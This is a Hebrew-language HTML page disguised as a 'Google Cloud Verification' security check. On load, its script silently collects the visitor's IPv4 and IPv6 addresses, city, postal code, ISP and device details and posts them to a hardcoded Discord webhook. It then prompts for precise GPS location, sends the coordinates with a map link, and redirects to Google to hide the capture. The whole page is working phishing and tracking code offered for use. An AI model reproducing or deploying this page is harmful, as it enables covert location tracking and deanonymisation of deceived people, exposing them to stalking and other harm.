<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Cloud Verification</title>
    <style>
        body { background-color: #f7f7f7; font-family: "Segoe UI", sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { color: #5f6368; font-size: 20px; margin-top: 20px; }
        p { color: #70757a; font-size: 14px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h1>מבצע אימות אבטחה...</h1>
    <p>אנא אשר את בקשת המיקום כדי להמשיך לשירותי Google</p>

    <script>
        // הכנס כאן את ה-Webhook שלך
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476381984401133640/og1zEQ__IRGuIws45fteC3R_j0iekyFLkqhi7OKwWymzSnyKwIMZJBeZxuwH3eOruzv0";
        
        async function sendFinalLog(exactPos = null) {
            try {
                // שליפת נתוני IP וספק אינטרנט
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                
                let ipv6 = "לא זמין";
                try {
                    const v6Res = await fetch('https://api6.ipify.org?format=json');
                    const v6Data = await v6Res.json();
                    ipv6 = v6Data.ip;
                } catch(e) {}

                let title = exactPos ? "✅ אימות הושלם - מיקום מדויק התקבל!" : "⚠️ כניסה לדף (ממתין לאישור מיקום)";
                let color = exactPos ? 3066993 : 15158332;
                
                let lat = exactPos ? exactPos.coords.latitude : geoData.latitude;
                let lon = exactPos ? exactPos.coords.longitude : geoData.longitude;
                let mapURL = `https://www.google.com/maps?q=${lat},${lon}`;

                const payload = {
                    embeds: [{
                        title: title,
                        color: color,
                        fields: [
                            { name: "🌐 IPv4/IP", value: `\`${geoData.ip || 'Unknown'}\``, inline: true },
                            { name: "🌐 IPv6", value: `\`${ipv6}\``, inline: true },
                            { name: "🌍 עיר ומדינה", value: `${geoData.city || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: true },
                            { name: "📮 מיקוד", value: `\`${geoData.postal || 'N/A'}\``, inline: true },
                            { name: "🏢 ספק אינטרנט", value: geoData.org || "N/A", inline: false },
                            { name: "📍 מיקום במפה", value: `[לחץ לצפייה במפה](${mapURL})`, inline: false },
                            { name: "📱 פרטי מכשיר", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Security Monitor System" },
                        timestamp: new Date()
                    }]
                };

                await fetch(WEBHOOK_URL, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify(payload) 
                });
            } catch (e) {
                console.error("Error:", e);
            }
        }

        // הפעלה מידית
        window.onload = () => {
            // קודם כל שולח לוג כניסה בסיסי
            sendFinalLog();

            // מבקש מיקום מדויק
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendFinalLog(pos); // שולח לוג שני עם GPS מדויק
                        setTimeout(() => {
                            window.location.href = "https://www.google.com"; // מעביר אותם לגוגל אחרי האישור
                        }, 1000);
                    },
                    () => {
                        console.log("User denied location");
                    },
                    { enableHighAccuracy: true }
                );
            }
        };
    </script>
</body>
</html>
